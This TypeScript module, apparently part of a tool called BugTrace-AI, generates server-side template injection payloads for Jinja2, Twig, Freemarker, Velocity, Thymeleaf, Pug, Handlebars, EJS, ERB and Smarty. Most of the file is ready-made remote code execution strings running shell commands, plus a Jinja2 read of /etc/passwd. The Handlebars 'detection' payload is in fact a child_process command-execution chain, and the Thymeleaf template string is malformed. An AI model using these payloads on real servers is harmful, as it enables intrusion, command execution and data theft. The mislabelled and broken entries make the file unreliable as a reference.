/**
 * BugTrace-AI SSTI Forge
 * Server-Side Template Injection payload generation for 10+ template engines
 * @module payload/ssti-forge
 */

export type TemplateEngine =
  | 'jinja2'      // Flask/Django (Python)
  | 'twig'        // Symfony (PHP)
  | 'freemarker'  // Java
  | 'velocity'    // Java
  | 'thymeleaf'   // Spring (Java)
  | 'pug'         // Node.js
  | 'handlebars'  // Node.js
  | 'ejs'         // Node.js
  | 'erb'         // Ruby
  | 'smarty';     // PHP

export type SSTIGoal = 'detect' | 'rce' | 'file-read' | 'file-write' | 'info-disclosure';

export interface SSTIPayload {
  engine: TemplateEngine;
  goal: SSTIGoal;
  payload: string;
  description: string;
  expectedOutput?: string;
}

/**
 * SSTIForge - Generate SSTI payloads for multiple template engines
 */
export class SSTIForge {
  /**
   * Generate SSTI payloads
   */
  generate(engine: TemplateEngine, goal: SSTIGoal, target?: string): SSTIPayload[] {
    const payloads: SSTIPayload[] = [];

    switch (engine) {
      case 'jinja2':
        payloads.push(...this.generateJinja2(goal, target));
        break;
      case 'twig':
        payloads.push(...this.generateTwig(goal, target));
        break;
      case 'freemarker':
        payloads.push(...this.generateFreemarker(goal, target));
        break;
      case 'velocity':
        payloads.push(...this.generateVelocity(goal, target));
        break;
      case 'thymeleaf':
        payloads.push(...this.generateThymeleaf(goal, target));
        break;
      case 'pug':
        payloads.push(...this.generatePug(goal, target));
        break;
      case 'handlebars':
        payloads.push(...this.generateHandlebars(goal, target));
        break;
      case 'ejs':
        payloads.push(...this.generateEJS(goal, target));
        break;
      case 'erb':
        payloads.push(...this.generateERB(goal, target));
        break;
      case 'smarty':
        payloads.push(...this.generateSmarty(goal, target));
        break;
    }

    return payloads;
  }

  /**
   * Jinja2 (Flask/Django) payloads
   */
  private generateJinja2(goal: SSTIGoal, target?: string): SSTIPayload[] {
    const payloads: SSTIPayload[] = [];

    if (goal === 'detect') {
      payloads.push({
        engine: 'jinja2',
        goal,
        payload: '{{7*7}}',
        description: 'Basic detection - should output 49',
        expectedOutput: '49'
      });
    }

    if (goal === 'rce') {
      payloads.push({
        engine: 'jinja2',
        goal,
        payload: `{{ self.__init__.__globals__.__builtins__.__import__('os').popen('${target || 'whoami'}').read() }}`,
        description: 'RCE via os.popen',
        expectedOutput: 'Command output'
      });

      payloads.push({
        engine: 'jinja2',
        goal,
        payload: `{{ config.__class__.__init__.__globals__['os'].popen('${target || 'id'}').read() }}`,
        description: 'RCE via config object',
        expectedOutput: 'Command output'
      });
    }

    if (goal === 'file-read') {
      payloads.push({
        engine: 'jinja2',
        goal,
        payload: `{{ self.__init__.__globals__.__builtins__.open('${target || '/etc/passwd'}').read() }}`,
        description: 'Read file',
        expectedOutput: 'File contents'
      });
    }

    return payloads;
  }

  /**
   * Twig (Symfony) payloads
   */
  private generateTwig(goal: SSTIGoal, target?: string): SSTIPayload[] {
    const payloads: SSTIPayload[] = [];

    if (goal === 'detect') {
      payloads.push({
        engine: 'twig',
        goal,
        payload: '{{7*7}}',
        description: 'Basic detection',
        expectedOutput: '49'
      });
    }

    if (goal === 'rce') {
      payloads.push({
        engine: 'twig',
        goal,
        payload: `{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("${target || 'whoami'}")}}`,
        description: 'RCE via filter callback',
        expectedOutput: 'Command output'
      });
    }

    return payloads;
  }

  /**
   * Freemarker (Java) payloads
   */
  private generateFreemarker(goal: SSTIGoal, target?: string): SSTIPayload[] {
    const payloads: SSTIPayload[] = [];

    if (goal === 'detect') {
      payloads.push({
        engine: 'freemarker',
        goal,
        payload: '${7*7}',
        description: 'Basic detection',
        expectedOutput: '49'
      });
    }

    if (goal === 'rce') {
      payloads.push({
        engine: 'freemarker',
        goal,
        payload: `<#assign ex="freemarker.template.utility.Execute"?new()> \${ex("${target || 'whoami'}")}`,
        description: 'RCE via Execute utility',
        expectedOutput: 'Command output'
      });
    }

    return payloads;
  }

  /**
   * Velocity (Java) payloads
   */
  private generateVelocity(goal: SSTIGoal, target?: string): SSTIPayload[] {
    const payloads: SSTIPayload[] = [];

    if (goal === 'detect') {
      payloads.push({
        engine: 'velocity',
        goal,
        payload: '#set($x=7*7)$x',
        description: 'Basic detection',
        expectedOutput: '49'
      });
    }

    if (goal === 'rce') {
      payloads.push({
        engine: 'velocity',
        goal,
        payload: `#set($rt = $class.forName('java.lang.Runtime'))
#set($chr = $class.forName('java.lang.Character'))
#set($ex=$rt.getRuntime().exec('${target || 'whoami'}'))
$ex.waitFor()
#set($out=$ex.getInputStream())
#foreach($i in [1..$out.available()])$chr.toString($out.read())#end`,
        description: 'RCE via Runtime.exec',
        expectedOutput: 'Command output'
      });
    }

    return payloads;
  }

  /**
   * Thymeleaf (Spring) payloads
   */
  private generateThymeleaf(goal: SSTIGoal, target?: string): SSTIPayload[] {
    const payloads: SSTIPayload[] = [];

    if (goal === 'detect') {
      payloads.push({
        engine: 'thymeleaf',
        goal,
        payload: '[[${7*7}]]',
        description: 'Basic detection',
        expectedOutput: '49'
      });
    }

    if (goal === 'rce') {
      payloads.push({
        engine: 'thymeleaf',
        goal,
        payload: `[[${T(java.lang.Runtime).getRuntime().exec('${target || 'whoami'}')}}]`,
        description: 'RCE via Runtime',
        expectedOutput: 'Command output'
      });
    }

    return payloads;
  }

  /**
   * Pug (Node.js) payloads
   */
  private generatePug(goal: SSTIGoal, target?: string): SSTIPayload[] {
    const payloads: SSTIPayload[] = [];

    if (goal === 'detect') {
      payloads.push({
        engine: 'pug',
        goal,
        payload: '#{7*7}',
        description: 'Basic detection',
        expectedOutput: '49'
      });
    }

    if (goal === 'rce') {
      payloads.push({
        engine: 'pug',
        goal,
        payload: `#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad("child_process").exec('${target || 'whoami'}')}()}`,
        description: 'RCE via child_process',
        expectedOutput: 'Command output'
      });
    }

    return payloads;
  }

  /**
   * Handlebars (Node.js) payloads
   */
  private generateHandlebars(goal: SSTIGoal, target?: string): SSTIPayload[] {
    const payloads: SSTIPayload[] = [];

    if (goal === 'detect') {
      payloads.push({
        engine: 'handlebars',
        goal,
        payload: '{{#with "s" as |string|}}{{#with "e"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub "constructor")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push "return require(\'child_process\').exec(\'whoami\');"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}',
        description: 'Basic detection',
        expectedOutput: '49'
      });
    }

    return payloads;
  }

  /**
   * EJS (Node.js) payloads
   */
  private generateEJS(goal: SSTIGoal, target?: string): SSTIPayload[] {
    const payloads: SSTIPayload[] = [];

    if (goal === 'detect') {
      payloads.push({
        engine: 'ejs',
        goal,
        payload: '<%=7*7%>',
        description: 'Basic detection',
        expectedOutput: '49'
      });
    }

    if (goal === 'rce') {
      payloads.push({
        engine: 'ejs',
        goal,
        payload: `<%=global.process.mainModule.require('child_process').execSync('${target || 'whoami'}')%>`,
        description: 'RCE via child_process',
        expectedOutput: 'Command output'
      });
    }

    return payloads;
  }

  /**
   * ERB (Ruby) payloads
   */
  private generateERB(goal: SSTIGoal, target?: string): SSTIPayload[] {
    const payloads: SSTIPayload[] = [];

    if (goal === 'detect') {
      payloads.push({
        engine: 'erb',
        goal,
        payload: '<%=7*7%>',
        description: 'Basic detection',
        expectedOutput: '49'
      });
    }

    if (goal === 'rce') {
      payloads.push({
        engine: 'erb',
        goal,
        payload: `<%=\`${target || 'whoami'}\`%>`,
        description: 'RCE via backticks',
        expectedOutput: 'Command output'
      });

      payloads.push({
        engine: 'erb',
        goal,
        payload: `<%=system('${target || 'id'}')%>`,
        description: 'RCE via system',
        expectedOutput: 'Command output'
      });
    }

    return payloads;
  }

  /**
   * Smarty (PHP) payloads
   */
  private generateSmarty(goal: SSTIGoal, target?: string): SSTIPayload[] {
    const payloads: SSTIPayload[] = [];

    if (goal === 'detect') {
      payloads.push({
        engine: 'smarty',
        goal,
        payload: '{7*7}',
        description: 'Basic detection',
        expectedOutput: '49'
      });
    }

    if (goal === 'rce') {
      payloads.push({
        engine: 'smarty',
        goal,
        payload: `{system('${target || 'whoami'}')}`,
        description: 'RCE via system',
        expectedOutput: 'Command output'
      });
    }

    return payloads;
  }

  /**
   * Generate report of SSTI payloads
   */
  generateReport(payloads: SSTIPayload[]): string {
    let report = '═══════════════════════════════════════════════════════\n';
    report += '            SSTI FORGE REPORT\n';
    report += '═══════════════════════════════════════════════════════\n\n';

    report += `Engine: ${payloads[0]?.engine || 'Unknown'}\n`;
    report += `Total Payloads: ${payloads.length}\n\n`;

    payloads.forEach((payload, index) => {
      report += `[${index + 1}] ${payload.goal.toUpperCase()}\n`;
      report += `Description: ${payload.description}\n`;
      if (payload.expectedOutput) {
        report += `Expected: ${payload.expectedOutput}\n`;
      }
      report += `Payload:\n${payload.payload}\n`;
      report += '-'.repeat(60) + '\n';
    });

    return report;
  }
}

export default SSTIForge;
